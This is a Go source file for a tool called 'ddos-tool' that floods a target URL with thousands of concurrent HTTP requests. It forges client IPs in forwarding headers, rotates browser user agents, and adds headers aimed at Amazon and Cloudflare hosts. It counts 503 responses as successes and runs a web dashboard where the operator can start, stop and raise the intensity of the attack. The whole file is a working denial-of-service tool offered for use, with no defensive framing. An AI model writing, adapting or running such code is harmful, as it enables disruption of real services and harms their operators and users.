package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/mux"
)

// Global counters
var (
	requestsSent    uint64
	successCount    uint64
	errorCount      uint64
	last503Count    uint64
	activeWorkers   uint64
	lastRequestTime int64
	attackRunning   atomic.Bool
	concurrency     = 5000
	attackMutex     sync.Mutex
	targetURL       string
)

func main() {
	if len(os.Args) < 2 {
		log.Fatal("Usage: ./ddos-tool <target-url>")
	}
	targetURL = os.Args[1]

	// Validate target
	if _, err := url.ParseRequestURI(targetURL); err != nil {
		log.Fatalf("Invalid URL: %v", err)
	}

	// Increase system limits
	runtime.GOMAXPROCS(runtime.NumCPU() * 4)

	// Start web dashboard
	router := mux.NewRouter()
	router.HandleFunc("/", serveDashboard)
	router.HandleFunc("/stats", statsHandler)
	router.HandleFunc("/control", controlHandler)
	
	fs := http.FileServer(http.Dir("./public"))
	router.PathPrefix("/public/").Handler(http.StripPrefix("/public/", fs))
	
	fmt.Println("Dashboard available at http://localhost:8080")
	go func() {
		log.Fatal(http.ListenAndServe(":8080", router))
	}()

	// Start attack
	attackRunning.Store(true)
	startAttack()
}

func startAttack() {
	sem := make(chan struct{}, concurrency)

	// Fill worker pool
	for i := 0; i < concurrency; i++ {
		sem <- struct{}{}
	}

	fmt.Printf("Starting attack on %s with %d workers\n", targetURL, concurrency)
	fmt.Println("Press Ctrl+C to stop")

	for attackRunning.Load() {
		<-sem // Wait for available worker slot
		go func() {
			defer func() { sem <- struct{}{} }()
			makeRequest()
			atomic.AddUint64(&requestsSent, 1)
			atomic.StoreInt64(&lastRequestTime, time.Now().UnixNano())
		}()
	}
}

func makeRequest() {
	ip := generateIP()
	dialer := &net.Dialer{
		Timeout:   3 * time.Second,
		KeepAlive: 0,
		LocalAddr: &net.TCPAddr{IP: net.ParseIP(ip)},
	}

	transport := &http.Transport{
		DialContext:       dialer.DialContext,
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:      0,
		IdleConnTimeout:   0,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
	}

	req, _ := http.NewRequest("GET", targetURL, nil)
	req.Header = generateHeaders(targetURL, ip)

	resp, err := client.Do(req)
	if err != nil {
		atomic.AddUint64(&errorCount, 1)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 503 {
		atomic.AddUint64(&last503Count, 1)
		atomic.AddUint64(&successCount, 1)
	} else if resp.StatusCode >= 400 {
		atomic.AddUint64(&errorCount, 1)
	} else {
		atomic.AddUint64(&successCount, 1)
	}
}

func generateIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(253)+1,
		rand.Intn(256),
		rand.Intn(256),
		rand.Intn(253)+1,
	)
}

func generateHeaders(target, ip string) http.Header {
	u, _ := url.Parse(target)
	h := http.Header{}

	// Standard headers
	h.Set("User-Agent", getRandomUA())
	h.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	h.Set("Accept-Language", "en-US,en;q=0.5")
	h.Set("Connection", "close")
	h.Set("X-Forwarded-For", ip)
	h.Set("X-Real-IP", ip)
	h.Set("CF-Connecting_IP", ip)

	// Custom headers based on domain
	switch {
	case strings.Contains(u.Host, "amazon"):
		h.Set("Referer", "https://www.amazon.com/")
		h.Set("Cookie", "session-id="+randomString(20))
	case strings.Contains(u.Host, "cloudflare"):
		h.Set("Referer", "https://www.cloudflare.com/")
		h.Set("CF-IPCountry", randomCountryCode())
	default:
		h.Set("Referer", "https://"+u.Host+randomPath())
	}

	// Browser-like headers
	if rand.Intn(10) > 7 {
		h.Set("Upgrade-Insecure-Requests", "1")
	}
	if rand.Intn(10) > 8 {
		h.Set("DNT", "1")
	}

	return h
}

func getRandomUA() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 14; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.147 Mobile Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
	}
	return agents[rand.Intn(len(agents))]
}

func randomString(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func randomPath() string {
	paths := []string{"/", "/search", "/products", "/contact", "/about", "/login"}
	return paths[rand.Intn(len(paths))] + "?q=" + randomString(6)
}

func randomCountryCode() string {
	codes := []string{"US", "GB", "DE", "FR", "CA", "JP", "BR", "IN", "RU", "CN"}
	return codes[rand.Intn(len(codes))]
}

func statsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"requests_sent": atomic.LoadUint64(&requestsSent),
		"success_count": atomic.LoadUint64(&successCount),
		"error_count":   atomic.LoadUint64(&errorCount),
		"503_count":     atomic.LoadUint64(&last503Count),
		"active_workers": concurrency,
		"last_request":  atomic.LoadInt64(&lastRequestTime),
		"rps":           calculateRPS(),
		"is_attacking":  attackRunning.Load(),
	})
}

func controlHandler(w http.ResponseWriter, r *http.Request) {
	action := r.URL.Query().Get("action")
	attackMutex.Lock()
	defer attackMutex.Unlock()

	switch action {
	case "start":
		if !attackRunning.Load() {
			attackRunning.Store(true)
			go startAttack()
		}
	case "stop":
		attackRunning.Store(false)
	case "intensity_up":
		concurrency = min(concurrency+500, 20000)
	case "intensity_down":
		concurrency = max(concurrency-500, 100)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":      "success",
		"action":      action,
		"concurrency": concurrency,
	})
}

func serveDashboard(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "./public/index.html")
}

func calculateRPS() float64 {
	if requestsSent < 100 {
		return 0
	}
	last := time.Unix(0, atomic.LoadInt64(&lastRequestTime))
	elapsed := time.Since(last).Seconds()
	if elapsed < 1 {
		return float64(requestsSent) / 5
	}
	return float64(requestsSent) / elapsed
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}
